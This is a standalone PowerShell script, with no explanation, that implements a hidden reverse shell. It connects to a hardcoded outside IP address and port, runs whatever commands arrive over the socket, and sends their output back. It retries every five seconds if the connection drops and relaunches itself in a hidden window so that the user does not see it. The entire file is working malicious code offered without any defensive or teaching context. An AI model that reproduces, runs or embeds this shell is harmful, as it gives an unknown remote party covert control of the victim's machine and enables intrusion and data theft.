$code='
$a=''147.185.221.28'';
$b=23921;
$c=''System.Net.Sockets.TCPClient'';
$d=''System.IO.StreamWriter'';
$e=''ASCII'';
$f=1024;
while ($true) {
 try {
  $g=New-Object $c($a,$b);
  $h=$g.GetStream();
  $i=New-Object $d($h);
  $i.AutoFlush=$true;
  $j=New-Object byte[] $f;
  while ($true) {
   $k=$h.Read($j,0,$j.Length);
   if ($k -le 0) { break }
   $l=[System.Text.Encoding]::$e.GetString($j,0,$k).Trim();
   try { $m=powershell.exe /c $l 2>&1 | Out-String } catch { $m=$_.Exception.Message }
   $i.WriteLine($m)
  }
  $i.Close();$h.Close();$g.Close()
 } catch { Start-Sleep -Seconds 5 }
}
'; Start-Process -WindowStyle Hidden powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -Command $code"; exit
